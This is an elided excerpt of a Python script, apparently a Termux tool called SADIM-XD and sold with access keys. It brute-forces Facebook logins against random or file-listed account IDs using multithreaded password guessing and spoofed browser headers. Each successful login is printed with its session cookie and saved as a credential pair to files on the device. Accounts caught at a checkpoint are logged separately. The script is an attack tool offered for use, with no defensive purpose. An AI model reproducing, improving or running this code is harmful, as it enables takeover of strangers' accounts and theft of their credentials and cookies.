...
time.sleep(2)
os.system(f'xdg-open https://facebook.com/groups/1295111931086162/')
...
try:
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[SADIM-XD')
...
[ JOIN MY FACEBOOK GROUP AND MORE COMMNAD]
 ...
 \33[1;37m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\33[1;37m 
┃ Tools    : FILE & RANDOM & EMAIL        
┃ Owner    : SADIM-NOBITA                
┃ Github   : Sadim-Team                 
┃ Version  :  0.3    
┃ What'sapp: +8801866364414        
\33[1;37m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\33[1;37m""")

#banner()
#file()
#print(f'\033[1;92m[\033[1;31m\033[1;92m]\033[0;92m WHAT IS YOUR NAME')
#SADIM_NAME=input(f'\033[1;92m[\033[1;31m\033[1;92m]\033[0;92m YOUR NAME :\x1b[1;96m ')
#--------------------[ BAGIAN-MASUK ]--------------#
...
def menu():
	...
	_SADIM_(f'\033[1;92m[\033[1;34m1\033[1;92m] FILE CLONE')
	_SADIM_(f'\033[1;92m[\033[1;92m\033[1;34m2\033[1;92m] RANDOM CLONE')
	_SADIM_(f'\033[1;92m[\033[1;92m\033[1;34m3\033[1;92m] EMAIL CLONE')
	_SADIM_(f'[\033[1;92m\033[1;34m4\033[1;92m] CONTACT ME')
	_SADIM_(f'\033[1;92m[\033[1;34m0\033[1;92m]\033[0;91m EXIT')
	_____SADIM_____ = input('\033[1;92m[\033[1;34m🙂\033[1;92m]\033[0;92mCHOOSE :\x1b[1;92m ')
	if _____SADIM_____ in ['1']:
		C1()
	if _____SADIM_____ in ['2']:
		Y2()
	if _____SADIM_____ in ['3']:
		BER()
	if _____SADIM_____ in ['4']:
		os.system("xdg-open https://www.facebook.com/profile.php?id=100093311227039")
	if _____SADIM_____ in ['0']:
		exit()
...
def passwrd():
	os.system('clear')
	banner()
	#print(f"\033[1;92m[\033[1;92m\033[1;31m\033[1;92m] YOUR NAME      \033[1;34m: \033[0;92m"+str(SADIM_NAME))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [SADIM] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[1;91m [\033[1;91mSADIM-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
				#open('/sdcard/'+SADIM-file clone,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				#print ()
				print(f'\r\x1b[1;92m [\033[1;92mSADIM-OK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')
				#print('\r\x1b[1;96m [\033[1;93mCOOKIES\033[1;96m]\033[1;91m= \033[1;97m '+kuki+'')
				cek_apk(session,coki)
				open('/sdcard/SADIM-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
				akun.append(idf+'|'+pw)
				break
...
def Y2():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=50) as SADIM:
        clear()
        tl = str(len(user))      
    ...
    try:
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mSADIM-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
               ###### print ('\033[1;36m[‎ 🎉 ]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
        	    cek_apk(session,coki)
        	    open('/sdcard/SADIM-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
        	elif 'checkpoint' in log_cookies:
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
        	    cid = coki[141:156]
        	   # print('\033[1;96m[SADIM.CP]\033[1;93m[😪]\033[1;96m'+cid+' | '+ps+'\033[1;94m.= '+tahunng(cid))
              #  print ('\033[1;32m[‎🥂🍻🍾🍷]\033[1;91m = \033[1;34m'+coki+'  \033[0;32m')
                #cek_apk(session,coki)
        	    open('/sdcard/SADIM-RANDOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
        	    cps.append(uid)
        	    break          
        	else:
        	    continue
        ...
        sys.stdout.write('\r%s[SADIM-XD]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
...
def SADIM(uid,pwv,tl):
    ...
    try:
        for ps in pwv:
            ...
            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="113.0.5644.211", "Google Chrome";v="113.0.5644.211"',
            'sec-ch-ua-mobile': '?0',
...
def mex():
    ...
    try:
        ...
        os.system('am start https://wa.me/+8801886653082?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20SADIM%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
    r = requests.get('https://raw.githubusercontent.com/MrSADIM156/approved.txt/main/approved.%20txt').text
    if key1 in r:
        ...
        os.system('am start https://wa.me/+8801866364414?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20SADIM%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
##################
